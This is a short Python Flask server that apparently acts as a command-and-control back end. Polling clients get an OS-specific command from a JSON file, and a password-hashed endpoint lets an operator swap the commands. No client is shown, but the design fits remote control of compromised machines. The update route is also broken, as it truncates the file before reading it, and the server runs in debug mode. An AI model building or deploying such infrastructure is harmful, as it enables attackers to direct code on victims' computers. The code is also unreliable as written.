from os import read
from flask import Flask,request,jsonify
import json
import hashlib


app=Flask(__name__)

secret_key="3f65226a0c3ef113bc8523d0172ee64b59cc45d7f6081e815ea212af5652dfd6" #doyal_baba

@app.route("/latest/",methods=["GET"])
def hostCommand():
    commands=json.loads(open("./comm.json").read())
    if request.args.get("os")=="Windows":
        return commands["Windows"]
    elif request.args.get("os")=="Linux":
        return commands["Linux"]
    elif request.args.get("os")=="Darwin":
        return commands["MacOS"]
    else:
        return commands["Others"]

@app.route("/update/",methods=["POST"])
def updateCommand():
    try:
        if hashlib.sha256(request.json["secret"].encode()).hexdigest()==secret_key:
            with open("./comm.json","w+") as handle:
                d=json.load(handle)
                if "Windows" in request.json:
                    d["Windows"]=request.json["Windows"]
                if "Linux" in request.json:
                    d["Linux"]=request.json["Linux"]
                if "MacOS" in request.json:
                    d["MacOS"]=request.json["MacOS"]
                if "Others" in request.json:
                    d["Others"]=request.json["Others"]
                json.dump(d,handle)
                return jsonify({
                    "success":True
                }),200
        else:
            return jsonify({
                "success":False
            }),503
    except KeyError:
        return jsonify({
            "msg":"SECRET_KEY not provided.",
            "success":False
        }),503
    
if __name__=="__main__":
    app.run(port=80,debug=True)
